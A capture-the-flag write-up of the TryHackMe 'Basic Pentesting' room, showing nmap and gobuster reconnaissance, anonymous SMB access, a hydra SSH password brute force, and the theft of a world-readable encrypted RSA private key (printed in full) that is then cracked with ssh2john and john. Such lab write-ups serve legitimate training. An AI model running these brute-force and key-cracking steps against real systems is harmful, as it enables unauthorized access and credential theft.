# THM Basic Pentesting Challenge

## Objective :

The aim is to compromise the given machine and then use privilege escalation to finish the challenge.

## Challenge :

ip target machine : 10.128.129.167

We first start with the active reconnaissance using nmap as passive reconnaissance is useless for this kind of challenges.

```shell
┌──(lika㉿KALI)-[~]
└─$ nmap -sV 10.128.129.167
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-21 09:07 -0700
Nmap scan report for 10.128.129.167
Host is up (0.042s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds
```

After reconnaissance, we have http protocols, it implies using gobuster to get hidden URL and look at web vulnerabilities. Look at gobuster command and results on port 80:

```shell
┌──(lika㉿KALI)-[~]
└─$ gobuster dir -u http://10.128.129.167:80 -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.128.129.167:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
development          (Status: 301) [Size: 322] [--> http://10.128.129.167/development/]
server-status        (Status: 403) [Size: 279]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

We intend to access those URL. /server-status is forbidden (admin only certainly) and in /development, we retrieve 2 messages that could be useful for after 

Message 1 :

```text
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

Message 2 :
```text
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

We also use gobuster for the others ports and their are either documentation on Apache nor innaccessible. We now know there's 2 protagonists, J and K. J has weak credentials, so it could mean we could brute force it thanks to wordlists and connect through ssh to its account. We still miss J username to only brute force its passsword. That's fine because we still have smb ports who are open (445). Let's try a smb anonymous connection and list shares :

```shell
┌──(lika㉿KALI)-[~]
└─$ smbclient -L //10.128.129.167 -N                                                                                   

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.128.129.167 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

We have access to Anonymous share, let's continue searching in it :

```shell
┌──(lika㉿KALI)-[~]
└─$ smbclient //10.128.129.167/Anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 10:31:20 2018
  ..                                  D        0  Thu Apr 19 10:13:06 2018
  staff.txt                           N      173  Thu Apr 19 10:29:55 2018

	    14282840 blocks of size 1024. 6220600 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
smb: \> exit

┌──(lika㉿KALI)-[~]
└─$ cat staff.txt    
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

We know know that the 2 people names are Kay and Jan. Their usernames are derived from this and are simply jan and kay. We now want to brute force the ssh login and we use hydra for this :

```shell
┌──(lika㉿KALI)-[~]
└─$ hydra -f -l jan -P /usr/share/wordlists/rockyou_top10000.txt -t 20 10.128.129.167 ssh
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-21 10:08:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 20 tasks per 1 server, overall 20 tasks, 10000 login tries (l:1/p:10000), ~500 tries per task
[DATA] attacking ssh://10.128.129.167:22/
[STATUS] 279.00 tries/min, 279 tries in 00:01h, 9727 to do in 00:35h, 14 active
[STATUS] 246.67 tries/min, 740 tries in 00:03h, 9267 to do in 00:38h, 13 active
[22][ssh] host: 10.128.129.167   login: jan   password: XXXXXXX
[STATUS] attack finished for 10.128.129.167 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-21 10:11:57
```

We can now connect to its session using its credentials. After performing some commands to better understand who jan is and what permission she/he grants, we can see the she/he doesn't have any permissions, as this user cannot even create a file, as I tried to download pspy64 to look in real time at process.

```shell
jan@ip-10-128-129-167:~$ curl -O http://192.168.153.53:8080/pspy64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0Warning: Failed to create the file pspy64: Permission denied
  0 3032k    0  7464    0     0   140k      0  0:00:21 --:--:--  0:00:21  137k
curl: (23) Failed writing body (0 != 7464)
```

I then explored Kay folder and we discover something very interesting !

```shell
jan@ip-10-128-129-167:~$ cd ../kay
jan@ip-10-128-129-167:/home/kay$ cd ./.ssh
jan@ip-10-128-129-167:/home/kay/.ssh$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
jan@ip-10-128-129-167:/home/kay/.ssh$ cat authorized_keys 
```

Every user can read its id_rsa. This is very dangerous because the id_rsa file contains the private key used for ssh authentication. 

```shell
jan@ip-10-128-129-167:/home/kay/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

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
-----END RSA PRIVATE KEY-----
```

I retrieved the id_rsa file and put it in a file named Kay_id_rsa.txt on my own device. After that, in order to brute force its hash thanks to john, we use the ssh2john tool that format correctly the file for john. 
```shell
┌──(lika㉿KALI)-[~/…/Cesure/CTF_Challenges/THM_CTF/Basic_Pentesting]
└─$ ssh2john Kay_id_rsa.txt > id_rsa.hash                                                                                                                                                                                                                                               
┌──(lika㉿KALI)-[~/…/Cesure/CTF_Challenges/THM_CTF/Basic_Pentesting]
└─$ cat id_rsa.hash 
Kay_id_rsa.txt:$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad8f779e84676de801a2712ef86e499d5cad1af838d19402729c471837fbdbe7eb172e8e9cd40ee52d959a3d772204241e305194ee7813ec99be3ced17455644ce550ad51edcb52b668bcb62e46b60a77e3cfc2e5bfe14c69db0d5d1be3c3f1d18867173d8f01ee7b00d5e88f62b3d91c81f740e14862548f318bfbf510bae62e9fae40d2bf15f36dd7d702400dfb74f9154e3d00454a049b599cb4c4070df59b18efd252d702a21a5f941f79731a70840e51608701396955798d946e01686edc557b350263e279f971eee37846e07d3594b8669d25a656c26f85046b05f44edf9529dea4ce1f8193469485640909d9dbfd4f9d45ab2ede8c6aca494a53674fb1e53bae5bcf02a6bacbea202bfc284db9d3ae446780aa8b431325948599c9ee32acb1137dcdbbe61cd555887a1642e0b4e7da972d1b32a188accf9e595a173ab64f065bfc8b23530dd0c4de3463a9b38694fb34d6101628847150f684af5f25719f8e958d34570da834bdb129482d4295768f01f4e3219d5db7c92d85a55f19c926954c84a0ba6bbe697b8655c5f98cb7441c2b8a0a3b569118ca8b14dc1a3f125857a1dab94a1513137b6d4a68f9e2d856ce66a39b5ba560e18b43517e718fd6de9b9fb4ef6fbec009ac86cc774ba4802a666bffd21c114e7adb455858d4251fef118d99b9b3607ccd130329a44da2f261526951422440b7703827e53bd05177e1e82249455ae177157256a563b28b7e0b317b99b5a6e6716c4cf3e53a79dd0ba266ad41148de21b2f305c5ba6d7e6cf9bf7978579c79632655e0745a1aa73ed0ed56d837b05763c69d218065ea2b86c03019cce1c84570aed1a6f0918ec2b25985440c9318bdcf3b674cacbcea559fd5a714e51d38df94e2960fe8f98d53865dd907a434859811764864ccb2a6e18215d03448045febf90ac06a073800822b78a101028a6cef927e581705a1d76fa934a1c31001620ec5826e9cf28df1bcf39502c9b3526b65789b86555a3de57b5f6e4d694caee6ee1b82d1616ff7fc68129b7a5e1795647ee07c5ba2da49c7a45507210f67f91588eab74b51a9c074916689f7db4c40e2138f91c1bae890f21e54ba077dbcb95888e836ba7eb6223a70384c48c94cf3b946971210a40a220eb980809ba5c5a3d54e08f6610765e1dcd2bda5cae7d96e77d852bd2a095a3cfa64bc5fbe6c79ea0dcfc6ae40be03238217213ab9b1a0873f8cbf9ed9b3d40dd0d0536365702a7452bf85301d84c4397621979cdc37b5b983f301af78655f352684c57799037f633a09b755ba0de9c017a73d76e0a8f46c4c33c4207358a8b408f1c52d8b8ca0378ba8ffcd224a125e5a0973c6997a6225e51007e600c22d3e24ebbc1e8bd8ff250eb32d44f4bd298ba27a3522215db0c3b89d49f2277cfedd74c3b59a1497936263826308f2e14cd363025aa7a5c39aa9a77b815dd10ff6ac9a5d8bda4074513f0fad3b6df926da5ca3c51f47479a8c271a60dab493fe78cadce92f3debe1c05ef72f3f194a36d23bfa3b0d4f0b8f04236d485be8d7d97dfb1c5de79613568d58f113308e8a73c7b87ca11b7b53e63d37f055b5bb7e5f39982e7bbedea3aae16daa3b29ccd8f9d98d53e97a1fbc0c1a2e701e5b7d7b224a4371358b02103e25b29c54138b8c4b7c9706967fe384b263c284ceb0336887e7da79e3c10d54d85689c0db4c379388b2138d0c40017fd2256aae3a2d21a93116a134d5f0ce8ce1fbf2c61509868c823fccdff62aca54796ff99aa5b0bc588af10537f26eccfa6962e595fbeac9df244f6cbaf6b77a11cfd8078de615833305fe0ae0d22173e8d744435fe3a69a81313109f9c5cdcb56d67544a36aa27a3b7c0db50b3b829972368ff2ed998c1910b392720c0d4cbaa907a49f2c38f970503971d64b6972f5b7b5c34735a08129c2b7ee82c6ccc49ddc943a5ae2f4467c5d7a07859e39ae00023c771d59caca0817ce412d35849abd9d225ed96e34de5266b31fd4dd82dab9469582b1e41687a39f108da54b6e84771542cb11f5c522e62b79b6867e8a20df2e8c9bf9ff36634c0de536fa3d377fa27543b6c90895f13bdf50f03b2dd97e5d25d452fa6a0d225704eb3c19751864285dfe3031bc2ff5b0c5d19a7feae6ad5625757477aa3c3f0eb635717f1f5b9037b3a76425db2a2151e2810eefbb75853d939360d1240093b2497a8903eff9b98bc705c2afe0e5541af2bb06b0ec50e4caf798a7f59ffc3a3e70565d887b9f694bdfa64d15a70ed55eacccc69af3fe3cf5aa5b6e3a7186eb5036e12efe53fcc509719a6a6f3ec0c008cb6a035229a1597d9be6beb13444d84c93f2164844c8ae69aa13648578087b98e90dd03f9da47d9ce306dddc88dd80998bf6d3910d209bebb1a70f8b73d944d949b1b1b19b13a455776f3c2e6647fa6722fc2bad5b202502684e91514a11e3437a92a09febffcfc3d55095b43e14b0567e8f5cbd91728b693fe82b8f75ccaf27c0651152faaf0610d2edcabc0b9ac51895180fbf60b868771dee58edb97e99d5ca3592cc9733a76ae0b96ca5788be62e8fb006204c574482579701781b46ec979bdbc9d339e57967051ca87fadae7184bd79cac0af834632081c5df6189dcc4cc8a0170cac12c30c1fff21c4c17f20813112bf901df81c5d78ca22024f1cd58cb5b73c1d68c6529ce4b21d7b95941e099f9a6140bdd1f0ead9113b2e5f17c354aacf79a38a104d6f844559417552387182ba20d890203a6a5e9661d23d8b6fae351a208ef5550555592011fec39609858b6b22743b0cca80c97d58076a660be95e460177cab3fd6b690b01a0e4f5d0507157afe9c4dc7f384187256a9a5d56ab00d466d44e4f07e5f348e8f100e5abe1c4d1bbc207fa3617140a604b607c7e3f5020f9aabb0700ad790e7847e085eb2243e503bf7d097ae15a2ee6179262e351773bb880123c0a87a43f62380fbe08fc2c63ac08ffe2ba0c6deeefbdd49eeaa2ffd1053aceec67b25f92dcfd25b58fa4fab2328481af26f5f4b5d21e1312b78f913b7f08254b064336d84c1aa3c82582e1cde55b5a347d264cb9e98df34b5490831e5d212b38b7cd999daf186a97efd6250e1e6820079358542f77ac78ddd9a505919c318000fc47f8b80fc84f12cf58adf1a3ee3fc8190015058c16c414cc0d6017b9a1fb032ee20e842573b30fc3214ac5fb8962437477e81bb6479fa498f148924796d6d616218ec2a5fa0949def8542dc9b75fd95b75c26fbe91ef9b06e61e90e0df20bb973f33471dab5e87f4c1f0a5d8a7f4e653a8edb337116fa6e5ed858
```
Then we start the attack to check which hash corresponds to the one retrieved.

```shell
┌──(lika㉿KALI)-[~/…/Cesure/CTF_Challenges/THM_CTF/Basic_Pentesting]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
XXXXXXX          (Kay_id_rsa.txt)     
1g 0:00:00:00 DONE (2026-10-21 11:14) 6.666g/s 552106p/s 552106c/s 552106C/s bird..aries13
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now that we get the passphrase associated to the ssh key, we can connect to kay's account. I connected directly on the remote machine, where jan's account was running, but we can open a new terminal, give less permissions to the file using chmod 600 /Path/To/Your/id_rsa. Otherwise, you'd get access denied, because ssh is very strict on the permissions other users have on this file.

```shell
jan@ip-10-128-129-167:/home/kay/.ssh$ ssh -i id_rsa kay@10.128.129.167
Could not create directory '/home/jan/.ssh'.
The authenticity of host '10.128.129.167 (10.128.129.167)' can't be established.
ECDSA key fingerprint is SHA256:+Z9sWT83sVBrBRZHXhia1w7W5P++w0dy90zUTPZZVOA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/jan/.ssh/known_hosts).
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 21 Oct 2026 02:27:51 PM EDT

  System load:  0.04               Processes:             119
  Usage of /:   50.2% of 13.62GB   Users logged in:       1
  Memory usage: 65%                IPv4 address for ens5: 10.128.129.167
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Wed Oct 21 14:24:01 2026 from 10.128.129.167
kay@ip-10-128-129-167:~$ 
```

Looking at pass.bak file, we can retrieve the last password needed to complete this challenge.

```shell
kay@ip-10-128-129-167:~$ cat pass.bak 
XXXXXXX
```

## Key takeaway

* If the target machine has http ports open, this implies using gobuster
* If the target machine has smb ports open, this implies trying an anonymous connection
* If the target machine has ssh port open, this might implies using hydra to brute force its login
* rsa private keys can be cracked offline using john and must never be visible by anyone else than us
